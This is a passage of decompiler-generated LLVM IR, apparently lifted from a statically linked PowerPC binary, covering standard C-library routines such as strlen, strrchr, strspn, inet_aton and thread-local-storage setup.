  store i32 0, i32* @r30, align 4
  %v2_1000f46c8 = load i8, i8* %arg1, align 1
  %v3_1000f46c9 = zext i8 %v2_1000f46c8 to i32
  store i32 %v0_1000f44c, i32* @r3, align 4
  %v1_1000f47410 = add i32 %tmp, 1
  store i32 %v1_1000f47410, i32* @r31, align 4
  %v3_1000f47812 = icmp eq i8 %v2_1000f46c8, 0
  store i32 %v3_1000f46c9, i32* @r4, align 4
  br i1 %v3_1000f47812, label %dec_label_pc_1000f484, label %dec_label_pc_1000f45c

dec_label_pc_1000f45c:                            ; preds = %entry, %dec_label_pc_1000f468
  %v3_1000f46c14 = phi i32 [ %v3_1000f46c, %dec_label_pc_1000f468 ], [ %v3_1000f46c9, %entry ]
  %v0_1000f47013 = phi i32 [ %v0_1000f470.pre, %dec_label_pc_1000f468 ], [ %v0_1000f44c, %entry ]
  store i32 268498016, i32* @lr, align 4
  %v2_1000f45c = call i32 @__GI_strchr(i32 %v0_1000f47013, i32 %v3_1000f46c14)
  %v3_1000f460 = icmp eq i32 %v2_1000f45c, 0
  %v0_1000f468 = load i32, i32* @r30, align 4
  br i1 %v3_1000f460, label %dec_label_pc_1000f468, label %dec_label_pc_1000f484

dec_label_pc_1000f468:                            ; preds = %dec_label_pc_1000f45c
  %v1_1000f468 = add i32 %v0_1000f468, 1
  %v0_1000f46c.pre = load i32, i32* @r31, align 4
  %v0_1000f470.pre = load i32, i32* @r29, align 4
  store i32 %v1_1000f468, i32* @r30, align 4
  %v1_1000f46c = inttoptr i32 %v0_1000f46c.pre to i8*
  %v2_1000f46c = load i8, i8* %v1_1000f46c, align 1
  %v3_1000f46c = zext i8 %v2_1000f46c to i32
  store i32 %v0_1000f470.pre, i32* @r3, align 4
  %v1_1000f474 = add i32 %v0_1000f46c.pre, 1
  store i32 %v1_1000f474, i32* @r31, align 4
  %v3_1000f478 = icmp eq i8 %v2_1000f46c, 0
  store i32 %v3_1000f46c, i32* @r4, align 4
  br i1 %v3_1000f478, label %dec_label_pc_1000f484, label %dec_label_pc_1000f45c

dec_label_pc_1000f484:                            ; preds = %dec_label_pc_1000f468, %dec_label_pc_1000f45c, %entry
  %v0_1000f488 = phi i32 [ 0, %entry ], [ %v0_1000f468, %dec_label_pc_1000f45c ], [ %v1_1000f468, %dec_label_pc_1000f468 ]
  ret i32 %v0_1000f488

; uselistorder directives
  uselistorder i32 %v3_1000f46c, { 1, 0 }
  uselistorder i32 %v0_1000f470.pre, { 1, 0 }
  uselistorder i32 %v0_1000f46c.pre, { 1, 0 }
  uselistorder label %dec_label_pc_1000f45c, { 1, 0 }
}

define i32 @__GI_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_1000f4b43 = urem i32 %tmp, 4
  %v3_1000f4b45 = icmp eq i32 %v1_1000f4b43, 0
  br i1 %v3_1000f4b45, label %dec_label_pc_1000f4bc, label %dec_label_pc_1000f4a4

dec_label_pc_1000f4a4:                            ; preds = %entry, %dec_label_pc_1000f4b0
  %v0_1000f4b0 = phi i32 [ %v1_1000f4b0, %dec_label_pc_1000f4b0 ], [ %tmp, %entry ]
  %v1_1000f4a4 = inttoptr i32 %v0_1000f4b0 to i8*
  %v2_1000f4a4 = load i8, i8* %v1_1000f4a4, align 1
  %v3_1000f4a8 = icmp eq i8 %v2_1000f4a4, 0
  br i1 %v3_1000f4a8, label %dec_label_pc_1000f4f0, label %dec_label_pc_1000f4b0

dec_label_pc_1000f4b0:                            ; preds = %dec_label_pc_1000f4a4
  %v1_1000f4b0 = add i32 %v0_1000f4b0, 1
  %v1_1000f4b4 = urem i32 %v1_1000f4b0, 4
  %v3_1000f4b4 = icmp eq i32 %v1_1000f4b4, 0
  br i1 %v3_1000f4b4, label %dec_label_pc_1000f4bc, label %dec_label_pc_1000f4a4

dec_label_pc_1000f4bc:                            ; preds = %dec_label_pc_1000f4b0, %entry
  %v0_1000f4c0 = phi i32 [ %tmp, %entry ], [ %v1_1000f4b0, %dec_label_pc_1000f4b0 ]
  br label %dec_label_pc_1000f4c8

dec_label_pc_1000f4c8:                            ; preds = %dec_label_pc_1000f524, %dec_label_pc_1000f4c8, %dec_label_pc_1000f4bc
  %v1_1000f51c = phi i32 [ %v0_1000f4c0, %dec_label_pc_1000f4bc ], [ %v1_1000f4cc, %dec_label_pc_1000f4c8 ], [ %v1_1000f4cc, %dec_label_pc_1000f524 ]
  %v1_1000f4c8 = inttoptr i32 %v1_1000f51c to i32*
  %v2_1000f4c8 = load i32, i32* %v1_1000f4c8, align 4
  %v1_1000f4cc = add i32 %v1_1000f51c, 4
  store i32 %v1_1000f4cc, i32* @r11, align 4
  %v1_1000f4d8 = add i32 %v2_1000f4c8, -16843009
  store i32 %v1_1000f4d8, i32* @r9, align 4
  %v2_1000f4dc = and i32 %v1_1000f4d8, -2139062144
  %v5_1000f4dc = icmp eq i32 %v2_1000f4dc, 0
  br i1 %v5_1000f4dc, label %dec_label_pc_1000f4c8, label %dec_label_pc_1000f4e4

dec_label_pc_1000f4e4:                            ; preds = %dec_label_pc_1000f4c8
  %v2_1000f4e4 = inttoptr i32 %v1_1000f51c to i8*
  %v3_1000f4e4 = load i8, i8* %v2_1000f4e4, align 1
  %v3_1000f4e8 = icmp eq i8 %v3_1000f4e4, 0
  br i1 %v3_1000f4e8, label %dec_label_pc_1000f4f0, label %dec_label_pc_1000f4f8

dec_label_pc_1000f4f0:                            ; preds = %dec_label_pc_1000f4a4, %dec_label_pc_1000f4e4
  %v1_1000f4f0 = phi i32 [ %v1_1000f51c, %dec_label_pc_1000f4e4 ], [ %v0_1000f4b0, %dec_label_pc_1000f4a4 ]
  %v2_1000f4f0 = sub i32 %v1_1000f4f0, %tmp
  ret i32 %v2_1000f4f0

dec_label_pc_1000f4f8:                            ; preds = %dec_label_pc_1000f4e4
  %v1_1000f4f8 = add i32 %v1_1000f51c, 1
  %v2_1000f4f8 = inttoptr i32 %v1_1000f4f8 to i8*
  %v3_1000f4f8 = load i8, i8* %v2_1000f4f8, align 1
  %v3_1000f4fc = icmp eq i8 %v3_1000f4f8, 0
  br i1 %v3_1000f4fc, label %dec_label_pc_1000f51c, label %dec_label_pc_1000f50c

dec_label_pc_1000f50c:                            ; preds = %dec_label_pc_1000f4f8
  %v1_1000f50c = add i32 %v1_1000f51c, 2
  %v2_1000f50c = inttoptr i32 %v1_1000f50c to i8*
  %v3_1000f50c = load i8, i8* %v2_1000f50c, align 1
  %v3_1000f510 = icmp eq i8 %v3_1000f50c, 0
  br i1 %v3_1000f510, label %dec_label_pc_1000f51c, label %dec_label_pc_1000f524

dec_label_pc_1000f51c:                            ; preds = %dec_label_pc_1000f50c, %dec_label_pc_1000f4f8
  %.pn = phi i32 [ 1, %dec_label_pc_1000f4f8 ], [ 2, %dec_label_pc_1000f50c ]
  %storemerge = sub i32 %.pn, %tmp
  %v2_1000f51c = add i32 %storemerge, %v1_1000f51c
  ret i32 %v2_1000f51c

dec_label_pc_1000f524:                            ; preds = %dec_label_pc_1000f50c
  %v1_1000f524 = add i32 %v1_1000f51c, 3
  %v2_1000f524 = inttoptr i32 %v1_1000f524 to i8*
  %v3_1000f524 = load i8, i8* %v2_1000f524, align 1
  %v3_1000f528 = icmp eq i8 %v3_1000f524, 0
  br i1 %v3_1000f528, label %dec_label_pc_1000f530, label %dec_label_pc_1000f4c8

dec_label_pc_1000f530:                            ; preds = %dec_label_pc_1000f524
  %v1_1000f530 = sub i32 3, %tmp
  %v2_1000f534 = add i32 %v1_1000f51c, %v1_1000f530
  ret i32 %v2_1000f534

; uselistorder directives
  uselistorder i32 %v1_1000f4cc, { 2, 1, 0 }
  uselistorder i32 %v1_1000f51c, { 2, 3, 1, 4, 5, 0, 6, 8, 7 }
  uselistorder i32 %v1_1000f4b0, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 3, 4, 2, 1, 0 }
  uselistorder i32 3, { 95, 96, 1, 2, 97, 98, 99, 100, 106, 0, 6, 33, 101, 7, 102, 8, 103, 104, 105, 43, 45, 46, 107, 108, 109, 85, 86, 44, 34, 35, 9, 47, 48, 49, 3, 50, 52, 53, 54, 55, 56, 57, 10, 37, 58, 36, 51, 38, 59, 60, 62, 63, 61, 64, 65, 4, 66, 5, 67, 11, 39, 12, 68, 14, 69, 40, 13, 70, 71, 72, 15, 16, 17, 73, 74, 75, 18, 19, 20, 76, 77, 21, 22, 23, 78, 79, 41, 80, 24, 25, 26, 81, 82, 27, 28, 29, 83, 84, 30, 31, 32, 87, 88, 89, 90, 91, 92, 42, 93, 94 }
  uselistorder label %dec_label_pc_1000f4f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f4a4, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v1_1000f548 = urem i32 %arg2, 256
  store i32 %v1_1000f548, i32* %r31.global-to-local, align 4
  %v3_1000f548 = icmp eq i32 %v1_1000f548, 0
  br i1 %v3_1000f548, label %dec_label_pc_1000f560, label %dec_label_pc_1000f57c

dec_label_pc_1000f560:                            ; preds = %entry
  %v2_1000f574 = call i32 @__GI_strchr(i32 0, i32 0)
  %v0_1000f57c.pre.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1000f578

dec_label_pc_1000f578:                            ; preds = %dec_label_pc_1000f57c, %dec_label_pc_1000f560
  %v0_1000f57c.pre = phi i32 [ %v1_1000f58c, %dec_label_pc_1000f57c ], [ %v0_1000f57c.pre.pre, %dec_label_pc_1000f560 ]
  %v0_1000f578 = phi i32 [ %v2_1000f584, %dec_label_pc_1000f57c ], [ %v2_1000f574, %dec_label_pc_1000f560 ]
  %v0_1000f580.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000f57c

dec_label_pc_1000f57c:                            ; preds = %entry, %dec_label_pc_1000f578
  %v0_1000f580 = phi i32 [ %v0_1000f580.pre, %dec_label_pc_1000f578 ], [ %v1_1000f548, %entry ]
  %v0_1000f57c = phi i32 [ %v0_1000f57c.pre, %dec_label_pc_1000f578 ], [ %arg1, %entry ]
  %storemerge = phi i32 [ %v0_1000f578, %dec_label_pc_1000f578 ], [ 0, %entry ]
  store i32 %storemerge, i32* %r30.global-to-local, align 4
  store i32 %v0_1000f57c, i32* @r3, align 4
  store i32 268498312, i32* @lr, align 4
  %v2_1000f584 = call i32 @__GI_strchr(i32 %v0_1000f57c, i32 %v0_1000f580)
  %v3_1000f588 = icmp eq i32 %v2_1000f584, 0
  store i1 %v3_1000f588, i1* @cr0_eq, align 1
  %v1_1000f58c = add i32 %v2_1000f584, 1
  br i1 %v3_1000f588, label %dec_label_pc_1000f594, label %dec_label_pc_1000f578

dec_label_pc_1000f594:                            ; preds = %dec_label_pc_1000f57c
  %v0_1000f598 = load i32, i32* %r30.global-to-local, align 4
  ret i32 %v0_1000f598

; uselistorder directives
  uselistorder i32 %v2_1000f584, { 0, 2, 1 }
  uselistorder i32 %v0_1000f57c, { 1, 0 }
  uselistorder i32 %v1_1000f548, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f57c, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v0_1000f5d82 = load i32, i32* @r3, align 4
  %v1_1000f5d83 = inttoptr i32 %v0_1000f5d82 to i8*
  %v2_1000f5d84 = load i8, i8* %v1_1000f5d83, align 1
  %v3_1000f5d85 = zext i8 %v2_1000f5d84 to i32
  store i32 %v3_1000f5d85, i32* @r11, align 4
  %v3_1000f5dc7 = icmp eq i8 %v2_1000f5d84, 0
  br i1 %v3_1000f5dc7, label %dec_label_pc_1000f5ec, label %dec_label_pc_1000f5e4

dec_label_pc_1000f5b4:                            ; preds = %dec_label_pc_1000f5b8
  %v3_1000f5b8 = zext i8 %v2_1000f5b8 to i32
  %v4_1000f5c4 = icmp eq i32 %v0_1000f5c49, %v3_1000f5b8
  %v1_1000f5bc = add i32 %v0_1000f5b8, 1
  br i1 %v4_1000f5c4, label %dec_label_pc_1000f5d0, label %dec_label_pc_1000f5b8

dec_label_pc_1000f5b8:                            ; preds = %dec_label_pc_1000f5b4, %dec_label_pc_1000f5e4
  %v0_1000f5b8 = phi i32 [ %v1_1000f5bc, %dec_label_pc_1000f5b4 ], [ %tmp, %dec_label_pc_1000f5e4 ]
  %v1_1000f5b8 = inttoptr i32 %v0_1000f5b8 to i8*
  %v2_1000f5b8 = load i8, i8* %v1_1000f5b8, align 1
  %v3_1000f5c0 = icmp eq i8 %v2_1000f5b8, 0
  br i1 %v3_1000f5c0, label %dec_label_pc_1000f5ec, label %dec_label_pc_1000f5b4

dec_label_pc_1000f5d0:                            ; preds = %dec_label_pc_1000f5b4
  %v1_1000f5d0 = add i32 %v0_1000f5d0, 1
  %v1_1000f5d4 = add i32 %v0_1000f5d4, 1
  %v1_1000f5d8 = inttoptr i32 %v1_1000f5d4 to i8*
  %v2_1000f5d8 = load i8, i8* %v1_1000f5d8, align 1
  %v3_1000f5d8 = zext i8 %v2_1000f5d8 to i32
  store i32 %v3_1000f5d8, i32* @r11, align 4
  %v3_1000f5dc = icmp eq i8 %v2_1000f5d8, 0
  br i1 %v3_1000f5dc, label %dec_label_pc_1000f5ec, label %dec_label_pc_1000f5e4

dec_label_pc_1000f5e4:                            ; preds = %entry, %dec_label_pc_1000f5d0
  %v0_1000f5d4 = phi i32 [ %v1_1000f5d4, %dec_label_pc_1000f5d0 ], [ %v0_1000f5d82, %entry ]
  %v0_1000f5d0 = phi i32 [ %v1_1000f5d0, %dec_label_pc_1000f5d0 ], [ 0, %entry ]
  %v0_1000f5c49 = phi i32 [ %v3_1000f5d8, %dec_label_pc_1000f5d0 ], [ %v3_1000f5d85, %entry ]
  br label %dec_label_pc_1000f5b8

dec_label_pc_1000f5ec:                            ; preds = %dec_label_pc_1000f5d0, %dec_label_pc_1000f5b8, %entry
  %v0_1000f5ec = phi i32 [ 0, %entry ], [ %v0_1000f5d0, %dec_label_pc_1000f5b8 ], [ %v1_1000f5d0, %dec_label_pc_1000f5d0 ]
  ret i32 %v0_1000f5ec

; uselistorder directives
  uselistorder label %dec_label_pc_1000f5e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f5b8, { 1, 0 }
}

define i32 @isatty() local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268498440, i32* @lr, align 4
  %v2_1000f604 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v3_1000f620 = icmp eq i8* %arg1, null
  br i1 %v3_1000f620, label %dec_label_pc_1000f6e0, label %dec_label_pc_1000f630

dec_label_pc_1000f630:                            ; preds = %entry
  %v3_1000f644.pre = load i32, i32* @global_var_100211b8, align 4
  br label %dec_label_pc_1000f640

dec_label_pc_1000f640:                            ; preds = %dec_label_pc_1000f630, %dec_label_pc_1000f6b8
  %v0_1000f6b8 = phi i32 [ 0, %dec_label_pc_1000f630 ], [ %v2_1000f6c0, %dec_label_pc_1000f6b8 ]
  %v0_1000f6bc = phi i32 [ 1, %dec_label_pc_1000f630 ], [ %v1_1000f6bc, %dec_label_pc_1000f6b8 ]
  %v0_1000f640 = phi i32 [ %tmp, %dec_label_pc_1000f630 ], [ %v0_1000f6403, %dec_label_pc_1000f6b8 ]
  %v1_1000f640 = inttoptr i32 %v0_1000f640 to i8*
  %v2_1000f640 = load i8, i8* %v1_1000f640, align 1
  %v3_1000f640 = zext i8 %v2_1000f640 to i32
  %v1_1000f648 = mul nuw nsw i32 %v3_1000f640, 2
  %v2_1000f64c = add i32 %v1_1000f648, %v3_1000f644.pre
  %v3_1000f64c = inttoptr i32 %v2_1000f64c to i16*
  %v4_1000f64c = load i16, i16* %v3_1000f64c, align 2
  %v1_1000f650 = and i16 %v4_1000f64c, 8
  %v3_1000f650 = icmp eq i16 %v1_1000f650, 0
  br i1 %v3_1000f650, label %dec_label_pc_1000f6e0, label %dec_label_pc_1000f658

dec_label_pc_1000f658:                            ; preds = %dec_label_pc_1000f640
  br label %dec_label_pc_1000f670

dec_label_pc_1000f660:                            ; preds = %dec_label_pc_1000f670
  %v1_1000f670 = mul i32 %v0_1000f6c0, 10
  %v1_1000f678 = add i32 %v1_1000f670, -48
  %v2_1000f660 = add i32 %v3_1000f674, %v1_1000f678
  %v1_1000f664 = add i32 %v0_1000f6a8, 1
  store i32 %v1_1000f664, i32* %r3.global-to-local, align 4
  %v2_1000f668 = icmp sgt i32 %v2_1000f660, 255
  br i1 %v2_1000f668, label %dec_label_pc_1000f6e0, label %dec_label_pc_1000f670

dec_label_pc_1000f670:                            ; preds = %dec_label_pc_1000f660, %dec_label_pc_1000f658
  %v0_1000f6a8 = phi i32 [ %v1_1000f664, %dec_label_pc_1000f660 ], [ %v0_1000f640, %dec_label_pc_1000f658 ]
  %v0_1000f6c0 = phi i32 [ %v2_1000f660, %dec_label_pc_1000f660 ], [ 0, %dec_label_pc_1000f658 ]
  %v1_1000f674 = inttoptr i32 %v0_1000f6a8 to i8*
  %v2_1000f674 = load i8, i8* %v1_1000f674, align 1
  %v3_1000f674 = zext i8 %v2_1000f674 to i32
  %v1_1000f67c = mul nuw nsw i32 %v3_1000f674, 2
  %v2_1000f680 = add i32 %v1_1000f67c, %v3_1000f644.pre
  %v3_1000f680 = inttoptr i32 %v2_1000f680 to i16*
  %v4_1000f680 = load i16, i16* %v3_1000f680, align 2
  %v5_1000f680 = zext i16 %v4_1000f680 to i32
  %v1_1000f684 = and i32 %v5_1000f680, 8
  %v3_1000f684 = icmp eq i32 %v1_1000f684, 0
  br i1 %v3_1000f684, label %dec_label_pc_1000f68c, label %dec_label_pc_1000f660

dec_label_pc_1000f68c:                            ; preds = %dec_label_pc_1000f670
  %v3_1000f68c = icmp eq i32 %v0_1000f6bc, 4
  br i1 %v3_1000f68c, label %dec_label_pc_1000f6a4, label %dec_label_pc_1000f694

dec_label_pc_1000f694:                            ; preds = %dec_label_pc_1000f68c
  %v3_1000f694 = icmp eq i8 %v2_1000f674, 46
  br i1 %v3_1000f694, label %dec_label_pc_1000f69c, label %dec_label_pc_1000f6e0

dec_label_pc_1000f69c:                            ; preds = %dec_label_pc_1000f694
  %v1_1000f69c = add i32 %v0_1000f6a8, 1
  store i32 %v1_1000f69c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f6b8

dec_label_pc_1000f6a4:                            ; preds = %dec_label_pc_1000f68c
  %v3_1000f6a4 = icmp eq i8 %v2_1000f674, 0
  %v1_1000f6a8 = add i32 %v0_1000f6a8, 1
  store i32 %v1_1000f6a8, i32* %r3.global-to-local, align 4
  br i1 %v3_1000f6a4, label %dec_label_pc_1000f6b8, label %dec_label_pc_1000f6b0

dec_label_pc_1000f6b0:                            ; preds = %dec_label_pc_1000f6a4
  %v1_1000f6b0 = and i32 %v5_1000f680, 32
  %v3_1000f6b0 = icmp eq i32 %v1_1000f6b0, 0
  br i1 %v3_1000f6b0, label %dec_label_pc_1000f6e0, label %dec_label_pc_1000f6b8

dec_label_pc_1000f6b8:                            ; preds = %dec_label_pc_1000f6b0, %dec_label_pc_1000f6a4, %dec_label_pc_1000f69c
  %v0_1000f6403 = phi i32 [ %v1_1000f6a8, %dec_label_pc_1000f6b0 ], [ %v1_1000f6a8, %dec_label_pc_1000f6a4 ], [ %v1_1000f69c, %dec_label_pc_1000f69c ]
  %v1_1000f6b8 = mul i32 %v0_1000f6b8, 256
  %v1_1000f6bc = add nuw nsw i32 %v0_1000f6bc, 1
  %v2_1000f6c0 = or i32 %v0_1000f6c0, %v1_1000f6b8
  %tmp14 = icmp slt i32 %v1_1000f6bc, 5
  br i1 %tmp14, label %dec_label_pc_1000f640, label %dec_label_pc_1000f6cc

dec_label_pc_1000f6cc:                            ; preds = %dec_label_pc_1000f6b8
  %v0_1000f6cc = load i32, i32* @r4, align 4
  %v3_1000f6cc = icmp eq i32 %v0_1000f6cc, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_1000f6cc, label %dec_label_pc_1000f6e4, label %dec_label_pc_1000f6d8

dec_label_pc_1000f6d8:                            ; preds = %dec_label_pc_1000f6cc
  %v2_1000f6d8 = inttoptr i32 %v0_1000f6cc to i32*
  store i32 %v2_1000f6c0, i32* %v2_1000f6d8, align 4
  %v0_1000f6ec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f6e4

dec_label_pc_1000f6e0:                            ; preds = %dec_label_pc_1000f694, %dec_label_pc_1000f6b0, %dec_label_pc_1000f640, %dec_label_pc_1000f660, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f6e4

dec_label_pc_1000f6e4:                            ; preds = %dec_label_pc_1000f6cc, %dec_label_pc_1000f6d8, %dec_label_pc_1000f6e0
  %v0_1000f6ec = phi i32 [ 1, %dec_label_pc_1000f6cc ], [ %v0_1000f6ec.pre, %dec_label_pc_1000f6d8 ], [ 0, %dec_label_pc_1000f6e0 ]
  ret i32 %v0_1000f6ec

; uselistorder directives
  uselistorder i32 %v1_1000f6bc, { 1, 0 }
  uselistorder i32 %v0_1000f6a8, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 5, { 19, 55, 20, 21, 0, 22, 23, 1, 35, 36, 2, 3, 37, 24, 38, 25, 39, 26, 40, 27, 41, 28, 29, 30, 42, 4, 31, 43, 5, 44, 32, 45, 33, 46, 6, 7, 47, 8, 10, 9, 11, 34, 48, 12, 13, 14, 49, 15, 17, 18, 16, 50, 51, 52, 53, 54 }
  uselistorder i8 0, { 3, 24, 23, 19, 26, 27, 28, 29, 25, 21, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 30, 31, 35, 32, 15, 33, 34, 20, 36, 37, 16, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 1, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 74, 75, 76, 77, 78, 79, 82, 83, 81, 86, 87, 88, 84, 85, 92, 89, 90, 22, 91, 18, 17, 93, 80, 94, 95, 96, 97, 98, 99, 100, 101 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 26, 1, 28, 27, 34, 29, 30, 0, 31, 32, 33, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 -48, { 1, 0 }
  uselistorder i32 10, { 91, 92, 2, 10, 93, 56, 55, 4, 95, 94, 8, 0, 19, 20, 21, 11, 22, 23, 12, 35, 36, 37, 38, 39, 34, 24, 5, 6, 7, 40, 25, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 3, 53, 26, 54, 27, 28, 29, 13, 14, 57, 58, 1, 59, 60, 61, 62, 63, 64, 65, 66, 9, 67, 15, 68, 69, 70, 71, 16, 72, 73, 74, 75, 17, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 30, 87, 31, 32, 88, 18, 89, 33, 90 }
  uselistorder i16 0, { 0, 2, 3, 4, 5, 7, 6, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 2, { 0, 1, 47, 239, 48, 49, 240, 241, 94, 242, 243, 95, 96, 97, 98, 99, 100, 244, 101, 102, 257, 64, 258, 245, 103, 104, 2, 255, 256, 65, 249, 3, 4, 250, 5, 6, 247, 7, 8, 9, 248, 246, 10, 11, 12, 13, 251, 252, 253, 14, 15, 254, 16, 17, 237, 18, 149, 238, 50, 66, 70, 105, 52, 51, 53, 106, 107, 71, 73, 72, 74, 150, 109, 110, 151, 20, 19, 22, 21, 152, 153, 75, 61, 155, 108, 62, 111, 154, 114, 115, 113, 112, 156, 76, 24, 23, 26, 25, 28, 27, 157, 158, 116, 117, 118, 68, 67, 69, 119, 77, 120, 121, 78, 122, 123, 54, 159, 55, 63, 160, 220, 29, 56, 221, 30, 161, 162, 163, 164, 165, 166, 167, 168, 169, 124, 170, 79, 171, 172, 173, 174, 175, 125, 176, 80, 177, 178, 179, 180, 181, 182, 183, 184, 126, 185, 81, 186, 127, 82, 128, 187, 188, 189, 190, 191, 192, 193, 194, 31, 32, 33, 34, 35, 36, 129, 195, 83, 196, 197, 198, 199, 200, 37, 38, 39, 40, 41, 42, 130, 201, 84, 202, 203, 204, 205, 206, 131, 207, 133, 208, 132, 209, 134, 210, 85, 211, 212, 213, 214, 216, 217, 218, 215, 135, 219, 86, 222, 223, 224, 136, 137, 225, 227, 228, 229, 226, 138, 230, 87, 57, 140, 88, 141, 89, 58, 142, 143, 90, 144, 91, 145, 92, 146, 231, 232, 93, 147, 44, 43, 46, 45, 233, 139, 234, 235, 59, 60, 236, 148 }
  uselistorder label %dec_label_pc_1000f6e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f6e0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1000f640, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268498692, i32* @lr, align 4
  %v1_1000f700 = call i32 @__syscall_rt_sigaction(i32 8)
  ret i32 %v1_1000f700
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 268566528, i32* @r11, align 4
  %v3_1000f71c = load i32, i32* @global_var_10021258.574, align 4
  %v3_1000f720 = load i32, i32* @global_var_10021254.575, align 4
  store i32 %v3_1000f720, i32* %r0.global-to-local, align 4
  %v1_1000f724 = add i32 %v3_1000f71c, 15
  %v1_1000f728 = load i32, i32* @r3, align 4
  %v2_1000f728 = add i32 %v1_1000f724, %v1_1000f728
  %v1_1000f72c = call i32 @__asm_rlwinm(i32 %v2_1000f728, i32 0, i32 0, i32 27)
  store i32 %v1_1000f72c, i32* @global_var_10021258.574, align 4
  %v0_1000f738 = load i32, i32* @r3, align 4
  store i32 %v0_1000f738, i32* @global_var_1002124c.576, align 4
  %v0_1000f740 = load i32, i32* @r4, align 4
  store i32 %v0_1000f740, i32* @global_var_10021250.577, align 4
  %v0_1000f748 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000f748, i32* @global_var_10021268.578, align 4
  ret i32 %v0_1000f738
}

define i32 @_dl_tls_setup() local_unnamed_addr {
entry:
  store i32 0, i32* @r3, align 4
  store i32 16, i32* @r4, align 4
  store i32 64, i32* @global_var_100232e8.579, align 4
  store i32 1, i32* @global_var_10021254.575, align 4
  store i32 ptrtoint (i32* @global_var_100232e8.579 to i32), i32* @global_var_1002125c.580, align 4
  %v0_1000f788 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v0_1000f7a0 = load i32, i32* @lr, align 4
  store i32 %v0_1000f7a0, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_1000f7c0 = load i32, i32* @global_var_1002126c.581, align 4
  %v3_1000f7c4 = icmp eq i32 %v3_1000f7c0, 0
  br i1 %v3_1000f7c4, label %dec_label_pc_1000f958, label %dec_label_pc_1000f804.preheader

dec_label_pc_1000f804.preheader:                  ; preds = %entry
  %v3_1000f8041 = load i32, i32* @global_var_10021270.582, align 4
  %v1_1000f8082 = mul i32 %v3_1000f8041, 32
  %v2_1000f80c4 = add i32 %v1_1000f8082, %v3_1000f7c0
  store i32 %v2_1000f80c4, i32* %r0.global-to-local, align 4
  %v2_1000f8106 = icmp ult i32 %v3_1000f7c0, %v2_1000f80c4
  br i1 %v2_1000f8106, label %dec_label_pc_1000f7d4, label %dec_label_pc_1000f958

dec_label_pc_1000f7d4:                            ; preds = %dec_label_pc_1000f804.preheader, %dec_label_pc_1000f800
  %v0_1000f7f0 = phi i32 [ %v1_1000f800, %dec_label_pc_1000f800 ], [ %v3_1000f7c0, %dec_label_pc_1000f804.preheader ]
  %v1_1000f7d4 = inttoptr i32 %v0_1000f7f0 to i32*
  %v2_1000f7d4 = load i32, i32* %v1_1000f7d4, align 4
  store i32 %v2_1000f7d4, i32* %r0.global-to-local, align 4
  %v3_1000f7d8 = icmp eq i32 %v2_1000f7d4, 7
  br i1 %v3_1000f7d8, label %dec_label_pc_1000f7e0, label %dec_label_pc_1000f800

dec_label_pc_1000f7e0:                            ; preds = %dec_label_pc_1000f7d4
  %v1_1000f7e0 = add i32 %v0_1000f7f0, 28
  %v2_1000f7e0 = inttoptr i32 %v1_1000f7e0 to i32*
  %v3_1000f7e0 = load i32, i32* %v2_1000f7e0, align 4
  %v1_1000f7e8 = add i32 %v0_1000f7f0, 20
